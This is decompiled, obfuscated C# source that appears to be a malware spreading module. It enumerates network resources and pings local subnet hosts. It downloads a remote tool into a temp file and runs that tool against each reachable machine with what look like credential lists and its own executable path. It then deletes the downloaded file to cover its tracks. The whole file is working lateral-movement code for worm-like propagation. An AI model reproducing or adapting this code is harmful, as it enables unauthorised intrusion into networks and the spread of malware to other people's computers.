using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class zBiFvXBiIzopyL
{
	public enum bBUnbGwlszoYHbx
	{
		RJDJCaQmOILTNXs = 1,
		jSLRfwwVNxZWla,
		jenLZfqwKs,
		CJDKcSATXQ,
		yuZQQMwSNh
	}

	public enum tPReoWvKuOiZ
	{
		bWhvBASgSdqbDEGK,
		IWJCtvbTWL,
		JjdXriZotjdl,
		hBdNxuJVWWHdAkA
	}

	public enum zjPfvyJtEFf
	{
		okguljfWlkXSS = 1,
		SknCCYraytx = 2,
		MzqRdvqDQtJD = 4,
		AUUyIfdUFnM = 8,
		lTjlcxOWeKPD = 16,
		begkWWnwtqYz = 19
	}

	public enum BjDCByoiKj
	{
		cibXdfZvHA,
		TJYDHXUlAzDCM,
		RJPoFSdLlmg,
		yjKUtBOATwLs,
		XEQcXDLngbM,
		OXfwKXROvPfZuvkL,
		jfpNToxreFv,
		fOrHkdpNzZrHI,
		gtfpbvcKWOd,
		xEUltWhdyzDHX,
		fMAqRUnTsfRaXE,
		JYOzshRfbbTTA
	}

	public sealed class DjTYucqnRNl : IEnumerable
	{
		private enum SCxCVRwenHwM
		{
			ZmPiONkXnuBROj = 0,
			xCtWwbpzjIkiIEN = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class PglqFvjKirozzakw
		{
			public bBUnbGwlszoYHbx wYmrMnJUScRT = (bBUnbGwlszoYHbx)0;

			public tPReoWvKuOiZ qVHofqkwIzii = tPReoWvKuOiZ.bWhvBASgSdqbDEGK;

			public BjDCByoiKj JEUdbMyWSfpjtq = BjDCByoiKj.cibXdfZvHA;

			public zjPfvyJtEFf OVMzDwtxunTFxv = (zjPfvyJtEFf)0;

			public string XzgGaaPVKQlzzfe = null;

			public string EbCFyNvAcIZdB = null;

			public string IWqyCoTjhwgDu = null;

			public string iMZJoHfYPJ = null;
		}

		private ArrayList lTOsIoNfrdIeV = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern SCxCVRwenHwM WNetOpenEnumA(bBUnbGwlszoYHbx dwScope, tPReoWvKuOiZ dwType, zjPfvyJtEFf dwUsage, PglqFvjKirozzakw p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern SCxCVRwenHwM WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern SCxCVRwenHwM WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(PglqFvjKirozzakw pglqFvjKirozzakw_0, bBUnbGwlszoYHbx bBUnbGwlszoYHbx_0, tPReoWvKuOiZ tPReoWvKuOiZ_0, zjPfvyJtEFf zjPfvyJtEFf_0, BjDCByoiKj bjDCByoiKj_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(bBUnbGwlszoYHbx_0, tPReoWvKuOiZ_0, zjPfvyJtEFf_0, pglqFvjKirozzakw_0, out lphEnum) == SCxCVRwenHwM.ZmPiONkXnuBROj)
			{
				SCxCVRwenHwM sCxCVRwenHwM;
				do
				{
					sCxCVRwenHwM = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (sCxCVRwenHwM)
					{
					case SCxCVRwenHwM.xCtWwbpzjIkiIEN:
						continue;
					case SCxCVRwenHwM.ZmPiONkXnuBROj:
						Marshal.PtrToStructure(intPtr, pglqFvjKirozzakw_0);
						if (pglqFvjKirozzakw_0.JEUdbMyWSfpjtq == bjDCByoiKj_0)
						{
							lTOsIoNfrdIeV.Add(pglqFvjKirozzakw_0.EbCFyNvAcIZdB);
						}
						if ((pglqFvjKirozzakw_0.OVMzDwtxunTFxv & zjPfvyJtEFf.SknCCYraytx) == zjPfvyJtEFf.SknCCYraytx)
						{
							EnumerateServers(pglqFvjKirozzakw_0, bBUnbGwlszoYHbx_0, tPReoWvKuOiZ_0, zjPfvyJtEFf_0, bjDCByoiKj_0);
						}
						continue;
					}
					break;
				}
				while (sCxCVRwenHwM != SCxCVRwenHwM.xCtWwbpzjIkiIEN);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public DjTYucqnRNl(bBUnbGwlszoYHbx bBUnbGwlszoYHbx_0, tPReoWvKuOiZ tPReoWvKuOiZ_0, zjPfvyJtEFf zjPfvyJtEFf_0, BjDCByoiKj bjDCByoiKj_0)
		{
			PglqFvjKirozzakw pglqFvjKirozzakw_ = new PglqFvjKirozzakw();
			EnumerateServers(pglqFvjKirozzakw_, bBUnbGwlszoYHbx_0, tPReoWvKuOiZ_0, zjPfvyJtEFf_0, bjDCByoiKj_0);
		}

		public IEnumerator GetEnumerator()
		{
			return lTOsIoNfrdIeV.GetEnumerator();
		}
	}

	private sealed class KKyzLRugtFuZ
	{
		public string fpLxfGuBOwJiSV;

		public string eaEHXCQIvG;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107386486)) && !string_0.StartsWith(getString_0(107386481)) && !string_0.StartsWith(getString_0(107386440)) && !string_0.Contains(getString_0(107386440))) || !sMIgMoBgKW(string_0))
			{
				return;
			}
			if (fQUgTOUpJumL.ZOYchrvgjtkVKhh == getString_0(107396956))
			{
				for (int i = 0; i < CitOyrPMpRgWe.Count; i++)
				{
					if (fQUgTOUpJumL.ryIZnDiEOid)
					{
						if (File.Exists(fpLxfGuBOwJiSV))
						{
							fQUgTOUpJumL.hsDlrZQtGPkuWD(fpLxfGuBOwJiSV, getString_0(107387794) + string_0 + getString_0(107411187) + CitOyrPMpRgWe[i] + getString_0(107411178) + dcARgWYNkLfIZZ[i] + getString_0(107411649) + Assembly.GetEntryAssembly()!.Location + getString_0(107387748));
						}
					}
					else if (File.Exists(eaEHXCQIvG))
					{
						fQUgTOUpJumL.hsDlrZQtGPkuWD(eaEHXCQIvG, getString_0(107387794) + string_0 + getString_0(107411187) + CitOyrPMpRgWe[i] + getString_0(107411178) + dcARgWYNkLfIZZ[i] + getString_0(107411616) + Assembly.GetEntryAssembly()!.Location + getString_0(107387748));
					}
				}
			}
			else if (fQUgTOUpJumL.ryIZnDiEOid)
			{
				if (File.Exists(fpLxfGuBOwJiSV))
				{
					fQUgTOUpJumL.hsDlrZQtGPkuWD(fpLxfGuBOwJiSV, getString_0(107387794) + string_0 + getString_0(107411559) + Assembly.GetEntryAssembly()!.Location + getString_0(107387748));
				}
			}
			else if (File.Exists(eaEHXCQIvG))
			{
				fQUgTOUpJumL.hsDlrZQtGPkuWD(eaEHXCQIvG, getString_0(107387794) + string_0 + getString_0(107411526) + Assembly.GetEntryAssembly()!.Location + getString_0(107387748));
			}
		}

		static KKyzLRugtFuZ()
		{
			Strings.CreateGetStringDelegate(typeof(KKyzLRugtFuZ));
		}
	}

	public static List<string> vfULIGXZYwqfd;

	public static string IsfSjXXGKE;

	public static List<string> CitOyrPMpRgWe;

	public static List<string> dcARgWYNkLfIZZ;

	public static List<string> yrNUulmllij;

	public List<string> pySmskIsUWntt = new List<string>();

	public List<string> WDeWeMVIIQa = new List<string>();

	public List<string> WHvJlDPSgTHvRz = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void iOKnjOxhgppnTr()
	{
		KKyzLRugtFuZ CS_0024_003C_003E8__locals0 = new KKyzLRugtFuZ();
		fQUgTOUpJumL.cRTbTQtOLTEXb();
		List<toDWRuOBvXD> list = toDWRuOBvXD.xIgkGbHQPPj();
		foreach (toDWRuOBvXD item in list)
		{
			vfULIGXZYwqfd.Add(item.IPAddress);
		}
		if (fQUgTOUpJumL.yDNKtVeuKTBPdF.Count > 0)
		{
			vfULIGXZYwqfd = vfULIGXZYwqfd.Union(fQUgTOUpJumL.yDNKtVeuKTBPdF).ToList();
		}
		CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV = getString_0(107389134);
		CS_0024_003C_003E8__locals0.eaEHXCQIvG = getString_0(107389134);
		try
		{
			CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV = CFJkmsEuYlsT();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.eaEHXCQIvG = hTvPqPWvfpqMj();
		}
		catch
		{
		}
		foreach (toDWRuOBvXD item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107386440)) || item2.IPAddress.StartsWith(getString_0(107386435)) || item2.IPAddress.StartsWith(getString_0(107386394)) || item2.IPAddress.Contains(getString_0(107386394)))
				{
					WnAmmOkZEmVXl.iUXgyfrbqWEqhEN(item2.MacAddress, item2.IPAddress, getString_0(107411887));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(vfULIGXZYwqfd, delegate(string string_0)
			{
				if ((string_0.StartsWith(KKyzLRugtFuZ.getString_0(107386486)) || string_0.StartsWith(KKyzLRugtFuZ.getString_0(107386481)) || string_0.StartsWith(KKyzLRugtFuZ.getString_0(107386440)) || string_0.Contains(KKyzLRugtFuZ.getString_0(107386440))) && sMIgMoBgKW(string_0))
				{
					if (fQUgTOUpJumL.ZOYchrvgjtkVKhh == KKyzLRugtFuZ.getString_0(107396956))
					{
						for (int i = 0; i < CitOyrPMpRgWe.Count; i++)
						{
							if (fQUgTOUpJumL.ryIZnDiEOid)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV))
								{
									fQUgTOUpJumL.hsDlrZQtGPkuWD(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV, KKyzLRugtFuZ.getString_0(107387794) + string_0 + KKyzLRugtFuZ.getString_0(107411187) + CitOyrPMpRgWe[i] + KKyzLRugtFuZ.getString_0(107411178) + dcARgWYNkLfIZZ[i] + KKyzLRugtFuZ.getString_0(107411649) + Assembly.GetEntryAssembly()!.Location + KKyzLRugtFuZ.getString_0(107387748));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.eaEHXCQIvG))
							{
								fQUgTOUpJumL.hsDlrZQtGPkuWD(CS_0024_003C_003E8__locals0.eaEHXCQIvG, KKyzLRugtFuZ.getString_0(107387794) + string_0 + KKyzLRugtFuZ.getString_0(107411187) + CitOyrPMpRgWe[i] + KKyzLRugtFuZ.getString_0(107411178) + dcARgWYNkLfIZZ[i] + KKyzLRugtFuZ.getString_0(107411616) + Assembly.GetEntryAssembly()!.Location + KKyzLRugtFuZ.getString_0(107387748));
							}
						}
					}
					else if (fQUgTOUpJumL.ryIZnDiEOid)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV))
						{
							fQUgTOUpJumL.hsDlrZQtGPkuWD(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV, KKyzLRugtFuZ.getString_0(107387794) + string_0 + KKyzLRugtFuZ.getString_0(107411559) + Assembly.GetEntryAssembly()!.Location + KKyzLRugtFuZ.getString_0(107387748));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.eaEHXCQIvG))
					{
						fQUgTOUpJumL.hsDlrZQtGPkuWD(CS_0024_003C_003E8__locals0.eaEHXCQIvG, KKyzLRugtFuZ.getString_0(107387794) + string_0 + KKyzLRugtFuZ.getString_0(107411526) + Assembly.GetEntryAssembly()!.Location + KKyzLRugtFuZ.getString_0(107387748));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV))
			{
				File.Delete(CS_0024_003C_003E8__locals0.fpLxfGuBOwJiSV);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.eaEHXCQIvG))
			{
				File.Delete(CS_0024_003C_003E8__locals0.eaEHXCQIvG);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string CFJkmsEuYlsT()
	{
		if (IntPtr.Size == 8)
		{
			return sDiHUgLKBWqrQx(new Uri(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107411354))));
		}
		return sDiHUgLKBWqrQx(new Uri(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107411354))));
	}

	public static string hTvPqPWvfpqMj()
	{
		if (IntPtr.Size == 8)
		{
			return sDiHUgLKBWqrQx(new Uri(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107411305))));
		}
		return sDiHUgLKBWqrQx(new Uri(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107411228))));
	}

	public static bool sMIgMoBgKW(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string sDiHUgLKBWqrQx(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107411123), getString_0(107389134)).Remove(0, 3) + getString_0(107411118);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static zBiFvXBiIzopyL()
	{
		Strings.CreateGetStringDelegate(typeof(zBiFvXBiIzopyL));
		vfULIGXZYwqfd = new List<string>();
		IsfSjXXGKE = getString_0(107389134);
		CitOyrPMpRgWe = new List<string>();
		dcARgWYNkLfIZZ = new List<string>();
		yrNUulmllij = new List<string>();
	}
}
